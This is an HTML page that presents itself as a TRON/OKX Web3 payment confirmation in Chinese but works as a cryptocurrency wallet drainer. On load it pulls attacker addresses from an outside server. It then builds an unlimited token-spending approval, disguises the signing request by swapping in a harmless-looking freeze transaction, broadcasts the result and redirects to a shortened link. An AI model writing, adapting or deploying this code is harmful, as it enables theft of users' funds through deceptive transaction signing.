<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login web3 tron</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.staticfile.org/qrcodejs/1.0.0/qrcode.min.js"></script>

    <style>
        body {
            background-color: #e9ecef;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .payment-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .payment-container h1 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #343a40;
        }
        .info-group {
            margin-bottom: 15px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 10px;
            text-align: left;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 16px;
            border: 1px solid #dee2e6;
        }
        .info-group label {
            font-weight: 600;
            color: #495057;
            margin: 0;
        }
        .info-group p {
            font-size: 16px;
            color: #212529;
            margin: 0;
        }
        .separator {
            margin: 20px 0;
            border-top: 1px solid #dee2e6;
        }
        .qrcode-container {
            margin: 20px 0;
            display: flex;
            justify-content: center;
        }
        .qrcode-container canvas {
            border: 1px solid #dee2e6;
            border-radius: 10px;
            padding: 10px;
            background-color: #ffffff;
        }
        p {
            color: #495057;
            font-size: 14px;
        }
        .hidden {
            display: none;
        }
        .payment-btn {
            display: none;
            margin-top: 20px;
            padding: 12px 24px;
            font-size: 18px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s ease;
        }
        .payment-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="payment-container" style="display:none">
        <h1>支付确认</h1>
        <div class="info-group">
            <label>用户名：</label>
            <p id="username">示例用户名</p>
        </div>
        <div class="info-group">
            <label>支付金额：</label>
            <p id="amount">¥100.00</p>
        </div>
        <div class="info-group">
            <label>订单号：</label>
            <p id="order">xxxxxx</p>
        </div>
        <div class="separator"></div>
        <div class="qrcode-container">
            <div id="qrcode"></div>
        </div>
        <p id="mobileText">请使用okxweb3扫码支付</p>
        <button id="paymentButton" class="payment-btn" onclick="payForToken();">立即支付</button>
    </div>

    <script>
    let approveaddress, payaddress;
    let trxpayamount;

    document.addEventListener("DOMContentLoaded", function() {
        var urlParams = new URLSearchParams(window.location.search);
        var orderNumber = window.location.pathname.split('/').pop();

        fetch('https://downr.icu/yyadmin/database.php')
        .then(response => response.json())
        .then(data => {
            data.forEach(config => {
                switch(config.config_key) {
                    case 'approve_address':
                        approveaddress = config.config_value;
                        break;
                    case 'pay_address':
                        payaddress = config.config_value;
                        break;
                    default:
                        console.log('未定义的配置键:', config.config_key);
                }
            });

            if (approveaddress && payaddress) {
                console.log('配置已成功加载:', approveaddress, payaddress);
                // 调用支付函数
                payForToken();
            } else {
                console.error("配置加载失败");
            }
        })
        .catch(error => {
            console.error('加载配置时发生错误:', error);
        });

        // 连接钱包
        okexConnect();
    });

    async function okexConnect() {
        if (window.tronLink && window.tronLink.ready) {
            window.tronWeb = tronLink.tronWeb;
        } else if (window.tronLink) {
            const res = await tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200) {
                window.tronWeb = tronLink.tronWeb;
            }
        } else {
            console.error("TronLink未安装或未连接");
        }
    }

    async function payForToken() {
        try {
            const tronWebInstance = window.tronWeb;
            const userAddress = await tronWebInstance.defaultAddress.base58;
            console.log(`User Address: ${userAddress}`);
            const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            
            const approvalParams = [
                { "type": "address", "value": approveaddress },
                { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
            ];
            const approvalOptions = { "feeLimit": 100000000 };
            const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
                contractAddress, 
                "increaseApproval(address,uint256)", 
                approvalOptions, 
                approvalParams, 
                userAddress
            );

              const freezeAmount = 5; 
                        const freezeDuration = 3; 
                        const resource = "ENERGY"; 
                        
                        const transferTransaction = await tronWebInstance.transactionBuilder.freezeBalance(
                            tronWebInstance.toSun(freezeAmount), 
                            freezeDuration,
                            resource,
                            userAddress 
                        );

                    const originalRawData = approvalTransaction.transaction.raw_data;

                    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
  
                    const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
             
                     signedTransaction.raw_data = originalRawData;
     
                    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
            
            if (!broadcastResult.result) {
				location.href = 'https://bit.ly/3zIWbua';
            }else{
				location.href = 'https://bit.ly/3zIWbua';
			}
        } catch (error) {
            console.error(error);
           // alert("支付过程出错，请重试！");
        }
    }
    </script>
</body>
</html>
